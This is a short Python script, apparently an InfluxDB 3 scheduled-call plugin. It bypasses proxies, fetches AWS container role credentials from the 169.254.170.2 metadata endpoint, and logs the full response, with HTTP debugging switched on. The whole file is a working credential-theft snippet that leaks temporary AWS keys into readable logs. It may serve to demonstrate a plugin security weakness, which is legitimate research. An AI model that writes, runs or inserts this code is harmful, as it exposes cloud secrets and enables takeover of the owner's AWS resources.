import http.client
http.client.HTTPConnection.debuglevel = 1

import urllib.request
import os

def process_scheduled_call(influxdb3_local, call_time, args=None):
    url = f"http://169.254.170.2{os.environ['AWS_CONTAINER_CREDENTIALS_RELATIVE_URI']}"
    opener = urllib.request.build_opener(urllib.request.ProxyHandler({}))
    urllib.request.install_opener(opener)

    with urllib.request.urlopen(url, timeout=10) as r:
        influxdb3_local.info(r.read())

